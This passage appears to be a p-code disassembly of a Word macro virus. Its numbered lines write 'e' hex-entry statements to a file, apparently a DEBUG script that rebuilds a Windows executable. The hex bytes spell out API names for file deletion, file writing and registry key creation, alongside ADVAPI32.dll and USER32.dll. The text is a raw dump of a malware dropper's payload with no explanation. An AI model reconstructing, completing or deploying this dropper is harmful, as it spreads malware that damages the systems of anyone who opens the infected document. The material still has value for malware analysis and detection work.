' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0810 46 69 6c 65 00 47 65 74 53 79 73 74 65 6d 54 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #120:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0820 6d 65 00 47 65 74 4d 6f 64 75 6c 65 48 61 6e 64 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #121:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0830 6c 65 41 00 47 65 74 57 69 6e 64 6f 77 73 44 69 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #122:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0840 72 65 63 74 6f 72 79 41 00 47 65 74 53 79 73 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #123:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0850 65 6d 44 69 72 65 63 74 6f 72 79 41 00 53 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #124:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0860 43 75 72 72 65 6e 74 44 69 72 65 63 74 6f 72 79 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #125:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0870 41 00 44 65 6c 65 74 65 46 69 6c 65 41 00 47 6c "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #126:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0880 6f 62 61 6c 41 6c 6c 6f 63 00 57 72 69 74 65 46 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #127:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0890 69 6c 65 00 ff 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #128:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #129:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #130:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #131:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #132:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #133:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 41 44 56 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #134:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0900 41 50 49 33 32 2e 64 6c 6c 00 52 65 67 43 72 65 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #135:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0910 61 74 65 4b 65 79 45 78 41 00 52 65 67 53 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #136:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0920 56 61 6c 75 65 45 78 41 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #137:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0930 00 4d 65 73 73 61 67 65 42 6f 78 41 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #138:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #139:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #140:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #141:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #142:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #143:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #144:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #145:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #146:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #147:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #148:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #149:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #150:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #151:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #152:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #153:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #154:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #155:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #156:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #157:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 47 65 74 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #158:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a80 4d 6f 64 75 6c 65 48 61 6e 64 6c 65 41 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #159:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0a90 00 00 55 53 45 52 33 32 2e 64 6c 6c 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #160:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0aa0 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #161:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #162:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #163:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #164:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #165:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #166:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #167:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #168:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #169:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #170:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #171:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #172:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #173:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 0b70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
